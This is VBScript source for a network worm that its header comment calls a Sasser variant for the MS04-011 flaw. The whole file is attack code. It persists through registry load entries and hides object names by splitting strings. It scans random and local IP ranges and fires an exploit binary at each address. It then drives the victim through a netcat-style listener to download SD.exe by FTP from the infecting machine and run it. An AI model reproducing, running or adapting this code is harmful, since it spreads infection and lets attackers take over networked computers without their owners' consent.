   'This Sasser(came from zerg) for MS-0411 coding by Sasser@PR.China2004-5-3
   on error resume next
   while true
   set fs = CreateObject("Scrip" & "ting.Fi" & "leSystemObject")
   Set wah= WScript.CreateObject("W" & "Scri" & "pt.S" & "hell")
   Set R = CreateObject("WScript.Shell")
   R.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load",fs.GetSpecialFolder(1) & "\Sasser.vbe","REG_SZ"
   R.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load",fs.GetSpecialFolder(1) & "\sd.exe","REG_SZ"
   R.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\Programs","com exe bat pif cmd vbe","REG_SZ"
   strComputer = "."
   set ws=createobject("mswinsock.winsock")
   meip=ws.localip
   oip=meip
   for i=1 to len(meip)
     s=s & mid(meip,len(meip)-i+2,1)
   next
   j=instr(s,".")
   meip=left(meip,len(meip)-j+1)
   Randomize
   r=Int((6*Rnd)+1)
   ip=r & ".txt"
   Set IPP = fs.opentextfile (ip,1)
   DO While IPP.AtEndOfStream <> True
   IP1 = IPP.Readline
   Randomize
   IP2=Int((254*Rnd)+1)
   IP3=Int((254*Rnd)+1)
   TIP=IP1 & IP2 & "." & IP3
   wah.Run "Cmd.exe /c hftp.exe 1323 1324 %systemroot%\system32 qnx dragon",0
   Set b = fs.CreateTextFile("cmd.txt",True)
   b.WriteLine("echo open " & oip & "1323>>%TEMP%\ftp.txt")
   b.WriteLine("echo qnx>>%TEMP%\ftp.txt")
   b.WriteLine("echo dragon>>%TEMP%\ftp.txt")
   b.WriteLine("echo bin>>%TEMP%\ftp.txt")
   b.WriteLine("echo lcd %systemroot%\system32>>%TEMP%\ftp.txt")
   b.WriteLine("echo get SD.exe>>%TEMP%\ftp.txt")
   b.WriteLine("echo bye>>%TEMP%\ftp.txt")
   b.WriteLine("ftp -s:%TEMP%\ftp.txt")
   b.WriteLine("del %temp%\ftp.txt")
   b.WriteLine("%systemroot%\system32\SD.exe")
   b.WriteLine("")
   b.WriteLine("")
   b.WriteLine("")
   b.Close
   wah.Run "Cmd.exe /c rn.exe -vv -l -p 7789<cmd.txt",0
   Randomize
   kk=Int((20*Rnd)+1)
   if kk<=16 then
   if kk/2=0 then
   wah.Run "Cmd.exe /c ms.exe 0 tip 7789 oip ",0
   Wscript.Sleep 5000
   else
   wah.Run "Cmd.exe /c ms.exe 1 tip 7789 oip",0
   Wscript.Sleep 5000
   end if
   else
   for ppp=1 to 255
   pp=meip
   pp=pp & ppp
   if kk/2=0 then
   wah.Run "Cmd.exe /c ms.exe 0 pp 7789 oip",0
   Wscript.Sleep 5000
   else
   wah.Run "Cmd.exe /c ms.exe 1 pp 7789 oip",0
   Wscript.Sleep 5000
   end if
   next
   end if
   Wscript.Sleep 3000
   strComputer = "."
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("Select * from Win32_Process Where Name = 'rn.exe'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Wscript.Sleep 100
   Next
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("Select * from Win32_Process Where Name = 'cmd.exe'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Wscript.Sleep 100
   Next
   Loop
   strComputer = "."
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("Select * from Win32_Process Where Name = 'ms.exe'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Wscript.Sleep 100
   Next
   strComputer = "."
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("Select * from Win32_Process Where Name = 'cmd.exe'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Wscript.Sleep 100
   Next
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("Select * from Win32_Process Where Name = 'rn.exe'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Wscript.Sleep 100
   Next
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colProcessList = objWMIService.ExecQuery _
   ("Select * from Win32_Process Where Name = 'hftp.exe'")
   For Each objProcess in colProcessList
   objProcess.Terminate()
   Wscript.Sleep 100
   Next
   wend
